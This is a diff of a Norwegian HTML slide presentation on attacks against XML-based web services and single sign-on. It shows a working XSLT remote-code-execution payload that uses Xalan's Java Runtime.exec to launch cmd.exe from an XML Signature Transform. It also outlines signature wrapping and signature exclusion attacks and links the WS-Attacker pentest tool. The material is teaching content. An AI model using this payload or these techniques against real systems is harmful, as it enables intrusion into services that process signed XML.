@@ -175,18 +175,14 @@
 		<p>Det er selvfølgelig muligheter for litt remote code execution her også</p>
 		<pre class="brush: xml; class-name: 'sixty-percent-text'">
 			&lt;Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116"&gt;
-			&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
-				xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" 
-				xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object" 
-				exclude-result-prefixes= "rt,ob"&gt; 
-				&lt;xsl:template match="/"&gt; 
-				&lt;xsl:variable name="runtimeObject" select="rt:getRuntime()"/&gt; 
-				&lt;xsl:variable name=“command" select="rt:exec( 
-				$runtimeObject,&apos;c:\Windows\system32\cmd.exe&apos;)"/&gt; 
-				&lt;xsl:variable name="commandAsString" select="ob:toString($command)"/&gt; 
-				&lt;xsl:value-of select="$commandAsString"/&gt; 
-				&lt;/xsl:template&gt; 
-			&lt;/xsl:stylesheet&gt; 
+				&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object" exclude-result-prefixes= "rt,ob"&gt; 
+					&lt;xsl:template match="/"&gt; 
+						&lt;xsl:variable name="runtimeObject" select="rt:getRuntime()"/&gt; 
+						&lt;xsl:variable name=“command" select="rt:exec($runtimeObject,&apos;c:\Windows\system32\cmd.exe&apos;)"/&gt; 
+						&lt;xsl:variable name="commandAsString" select="ob:toString($command)"/&gt; 
+						&lt;xsl:value-of select="$commandAsString"/&gt; 
+					&lt;/xsl:template&gt; 
+				&lt;/xsl:stylesheet&gt; 
 			&lt;/Transform&gt;
 		</pre>
 	</div>
@@ -194,7 +190,30 @@
 	<div class="step slide" data-x="1000" data-y="3300">
         <h3>Security of XML-based Web Services and Single Sign-On</h3>
 		<hr>
+		<h2>XML Signature Wrapping</h2>
+		<ul>
+			<li>Legg til en ekstra body med samme id som den signerte</li>
+			<li>Når meldingen skal verifiseres, så verifiseres den ekte</li>
+			<li>Når applikasjonen skal bruke meldingen, så brukes den nye bodyen</li>
+		</ul>
+    </div>
+	
+	<div class="step slide" data-x="1000" data-y="4100">
+        <h3>Security of XML-based Web Services and Single Sign-On</h3>
+		<hr>
+		<h2>XML Signature Exclusion</h2>
+		<ul>
+			<li>Enkelt og greit fjern hele signaturelementet</li>
+			<li>Skjedde f.eks. mot Amazon EC2</li>
+		</ul>
+    </div>
+	
+	<div class="step slide" data-x="1000" data-y="4900">
+        <h3>Security of XML-based Web Services and Single Sign-On</h3>
+		<hr>
 		<h2>WS-Attacker</h2>
+		<p>Verkøy som er laget spesielt for penetrasjonstesting med xml attacks</p>
+		<p><a href="http://sourceforge.net/projects/ws-attacker/">http://sourceforge.net/projects/ws-attacker/</a></p>
     </div>
 
 	<div class="step slide" data-x="2000" data-y="-1500">
